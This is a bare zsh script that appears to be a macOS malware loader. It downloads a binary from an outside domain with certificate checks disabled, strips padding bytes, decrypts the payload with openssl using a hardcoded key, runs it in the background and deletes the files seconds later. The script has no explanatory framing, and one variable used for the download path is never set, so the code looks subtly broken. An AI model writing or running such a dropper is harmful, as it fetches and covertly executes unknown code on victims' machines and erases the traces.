#!/bin/zsh
ygazr=$(mktemp /tmp/sztxg8.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/md24037dfe8ae83a9.bin" -o "$ygazrz" || exit 1
k7m3ry=$(stat -f %z "$ygazrz"); cragkrd=$(( k7m3ry - 3897 - 3692 ))
tail -c +$(( 3897 + 1 )) "$ygazrz" | head -c $cragkrd | openssl enc -d -aes-256-cbc -k 193717302f76901e081150fd -out "$ygazr" 2>/dev/null
[ -s "$ygazr" ] && chmod 700 "$ygazr" && ( "$ygazr" & ) && disown
( sleep 3; rm -f "$ygazr" "$ygazrz" ) &>/dev/null &
